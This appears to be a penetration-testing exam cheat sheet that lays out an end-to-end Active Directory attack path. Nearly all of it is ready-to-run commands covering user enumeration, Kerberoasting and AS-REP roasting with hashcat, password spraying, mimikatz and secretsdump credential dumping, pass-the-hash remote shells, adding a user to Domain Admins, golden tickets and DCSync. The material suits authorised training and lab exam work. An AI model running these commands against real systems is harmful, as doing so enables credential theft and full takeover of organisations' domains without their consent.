# Active Directory

**The AD set is 40/100 on the exam — the single highest-value target.** The pattern is almost always: get a **foothold** on one domain-joined host or a set of domain creds → **enumerate the domain** (BloodHound) → **harvest more creds** (Kerberoast/AS-REP/dumps) → **move laterally** → reach the **Domain Controller / Domain Admin**.

> Set variables:
> ```bash
> export DC=10.10.10.10 ; export DOMAIN=corp.local ; export USER=jdoe ; export PASS='Passw0rd!'
> ```
> Sync your clock to the DC to avoid Kerberos errors: `sudo ntpdate $DC` (or `sudo rdate -n $DC`).

---

## 1. Foothold (getting your first domain creds)

Common initial vectors:
- Web/service exploit on a domain-joined host → local shell → dump creds.
- Anonymous SMB/LDAP leaking usernames → password spray.
- **AS-REP roasting without creds** (users with "no pre-auth") → crack offline.
- Default/weak creds on a service; creds found in SMB shares, GPP (`Groups.xml`), scripts.

```bash
# Enumerate users with no creds (for spraying / AS-REP)
netexec smb $DC -u '' -p '' --rid-brute
enum4linux-ng -A $DC
impacket-lookupsid $DOMAIN/anonymous@$DC
```

---

## 2. Enumerate the domain

### Validate creds & sweep the network (NetExec)
```bash
netexec smb $DC -u $USER -p "$PASS"                    # valid? (Pwn3d! = local admin)
netexec smb 10.10.10.0/24 -u $USER -p "$PASS"          # spray one cred across subnet
netexec smb $DC -u $USER -p "$PASS" --users --groups --shares --pass-pol
netexec ldap $DC -u $USER -p "$PASS" --bloodhound --collection All --dns-server $DC
```

### BloodHound (map attack paths — the core AD tool)
```bash
# Remote collection (Python ingestor)
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC -c All --zip
# OR on a Windows host: SharpHound.exe -c All
```
Import the `.zip` into the BloodHound GUI. Mark owned nodes, run **"Shortest paths to Domain Admins"** and check "Kerberoastable", "AS-REP roastable", and each owned node's **Outbound Object Control** (ACL edges: `GenericAll`, `WriteDacl`, `ForceChangePassword`, `AddMember`, etc.).

### Manual LDAP / RPC
```bash
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" -b "DC=corp,DC=local"
rpcclient -U "$USER%$PASS" $DC   # enumdomusers; querygroup...
```

---

## 3. Credential attacks

### Kerberoasting (need any domain creds)
Service accounts (SPNs) → request tickets → crack offline. Often yields high-priv creds.
```bash
impacket-GetUserSPNs $DOMAIN/$USER:"$PASS" -dc-ip $DC -request -outputfile kerb.hashes
netexec ldap $DC -u $USER -p "$PASS" --kerberoasting kerb.hashes
# crack
hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt
```

### AS-REP roasting (no creds needed, for users with pre-auth disabled)
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC
impacket-GetNPUsers $DOMAIN/$USER:"$PASS" -request -dc-ip $DC
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

### Password spraying (careful with lockout policy — check `--pass-pol` first)
```bash
netexec smb $DC -u users.txt -p 'Season2025!' --continue-on-success
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Passw0rd!'
```

### Dump secrets from a host you own
```bash
# Local SAM + LSA + cached domain creds
impacket-secretsdump ./local.sam ...        # or:
impacket-secretsdump $DOMAIN/$USER:"$PASS"@$TARGET
# LSASS on the box → mimikatz
mimikatz # privilege::debug ; sekurlsa::logonpasswords ; sekurlsa::tickets
```

### GPP passwords (SYSVOL)
```bash
netexec smb $DC -u $USER -p "$PASS" -M gpp_password
# cpassword in Groups.xml is AES-decryptable → gpp-decrypt
```

---

## 4. Lateral movement (use creds / hashes on other hosts)

```bash
# Pass-the-Password / Pass-the-Hash across the subnet, find where you're admin:
netexec smb 10.10.10.0/24 -u $USER -p "$PASS"            # look for (Pwn3d!)
netexec smb 10.10.10.0/24 -u Administrator -H <NTLM>     # PtH

# Get a shell on a host where you're admin:
evil-winrm -i $TARGET -u $USER -p "$PASS"                # WinRM (5985)
impacket-psexec $DOMAIN/$USER:"$PASS"@$TARGET            # SYSTEM shell (noisy)
impacket-wmiexec $DOMAIN/$USER:"$PASS"@$TARGET           # stealthier, semi-interactive
impacket-smbexec / impacket-atexec                        # alternatives
# Pass-the-Hash with impacket:
impacket-psexec -hashes :<NTLM> Administrator@$TARGET
evil-winrm -i $TARGET -u Administrator -H <NTLM>
```

### Abusing ACL edges (from BloodHound)
```bash
# ForceChangePassword on a user
net rpc password "victim" "NewPass123!" -U "$DOMAIN/$USER%$PASS" -S $DC
# GenericAll on a user → set SPN + kerberoast, or reset password
# AddMember → add yourself to a privileged group
net rpc group addmem "Domain Admins" "$USER" -U "$DOMAIN/$USER%$PASS" -S $DC
# GenericAll on a computer → RBCD or read LAPS password
```

---

## 5. Kerberos ticket attacks

```bash
# Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass $DOMAIN/$USER@$TARGET

# Silver ticket (service hash) / Golden ticket (krbtgt hash) — after you own the domain
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain $DOMAIN Administrator
```

---

## 6. Domain domination (Domain Admin / DC)

```bash
# DCSync — dump ALL domain hashes (need Replication rights or DA)
impacket-secretsdump $DOMAIN/$USER:"$PASS"@$DC          # -just-dc for hashes only
netexec smb $DC -u $USER -p "$PASS" --ntds               # dump NTDS.dit
# with krbtgt hash → golden ticket → persistent DA
```
Once you have Domain Admin, get an interactive shell on the DC (`psexec`/`evil-winrm`), grab the flag, **screenshot with `ipconfig`**, and `secretsdump` the whole domain for the report.

---

## AD attack decision flow

1. **No creds?** → RID-brute/enum users → AS-REP roast → password spray.
2. **Have creds?** → BloodHound + NetExec sweep → find `(Pwn3d!)` hosts and ACL paths.
3. **Kerberoast + AS-REP** everything → crack → new creds → re-run BloodHound as new user.
4. **Where am I admin?** → `evil-winrm`/`psexec` → dump creds → repeat.
5. **Reach DA / replication rights** → `secretsdump`/`--ntds` → own the DC.

## Cheat table

| Goal | Tool |
|---|---|
| Validate/spray creds, PtH, sweep | `netexec` (smb/ldap/winrm/mssql) |
| Map attack paths | BloodHound + `bloodhound-python`/SharpHound |
| Kerberoast / AS-REP | `impacket-GetUserSPNs` / `impacket-GetNPUsers` |
| Dump hashes / DCSync / NTDS | `impacket-secretsdump` / `--ntds` |
| Remote shell | `evil-winrm`, `impacket-psexec/wmiexec` |
| Post-ex on host | `mimikatz` |
| Crack tickets | `hashcat -m 13100` (TGS) / `-m 18200` (AS-REP) |
